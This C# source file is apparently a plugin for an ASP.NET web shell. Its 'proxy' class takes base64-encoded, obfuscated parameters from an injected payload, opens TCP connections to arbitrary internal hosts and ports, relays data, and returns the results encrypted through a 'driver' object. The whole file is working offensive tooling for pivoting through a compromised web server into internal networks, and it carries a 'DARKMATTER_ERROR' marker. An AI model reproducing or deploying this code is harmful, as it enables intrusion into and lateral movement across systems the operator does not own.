using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;
using System.Net.Sockets;
using System.Net;

public class proxy
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] { abOutput, 1 });

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();

            Dictionary<string, string> dic = fnParseParams(szParam);
            
            if (!dic.ContainsKey("z0") || !dic.ContainsKey("z2") || !dic.ContainsKey("z3"))
            {
                fnWriteOutput(driver, response, Encoding.UTF8.GetBytes("{\"status\":\"error\",\"msg\":\"Missing parameters\"}"));
                return true;
            }

            string action = fnB64Decode(dic["z0"]).Trim();
            string targetIp = fnB64Decode(dic["z2"]).Trim();
            string targetPortStr = fnB64Decode(dic["z3"]).Trim();
            int targetPort = int.Parse(targetPortStr);

            string szResponseResult = "";

            if (action == "forward")
            {
                TcpClient tcpClient = null;
                try
                {
                    tcpClient = new TcpClient();
                    
                    var connectResult = tcpClient.BeginConnect(targetIp, targetPort, null, null);
                    var success = connectResult.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(3));
                    
                    if (!success)
                    {
                        throw new Exception("Connect timeout");
                    }
                    tcpClient.EndConnect(connectResult);

                    NetworkStream stream = tcpClient.GetStream();
                    stream.ReadTimeout = 1500;

                    if (dic.ContainsKey("z4") && !string.IsNullOrEmpty(dic["z4"]))
                    {
                        byte[] firstDecode = Convert.FromBase64String(dic["z4"]);
                        byte[] forwardData = Convert.FromBase64String(Encoding.UTF8.GetString(firstDecode));
                        if (forwardData.Length > 0)
                        {
                            stream.Write(forwardData, 0, forwardData.Length);
                            stream.Flush();
                        }
                    }

                    MemoryStream ms = new MemoryStream();
                    byte[] buffer = new byte[8192];
                    int retry = 0;

                    while (retry < 3)
                    {
                        Thread.Sleep(50);
                        if (tcpClient.Available > 0)
                        {
                            while (tcpClient.Available > 0)
                            {
                                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                                if (bytesRead > 0)
                                {
                                    ms.Write(buffer, 0, bytesRead);
                                }
                            }
                        }

                        if (ms.Length > 0)
                        {
                            break;
                        }
                        retry++;
                    }

                    byte[] responseData = ms.ToArray();
                    string base64Response = Convert.ToBase64String(responseData);

                    szResponseResult = "{\"status\":\"success\",\"data\":\"" + base64Response + "\"}";
                }
                catch (Exception)
                {
                    szResponseResult = "{\"status\":\"error\",\"msg\":\"Connect failed\"}";
                }
                finally
                {
                    if (tcpClient != null)
                    {
                        tcpClient.Close();
                    }
                }
            }
            else
            {
                szResponseResult = "{\"status\":\"error\",\"msg\":\"Unknown action\"}";
            }

            fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(szResponseResult));
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }
}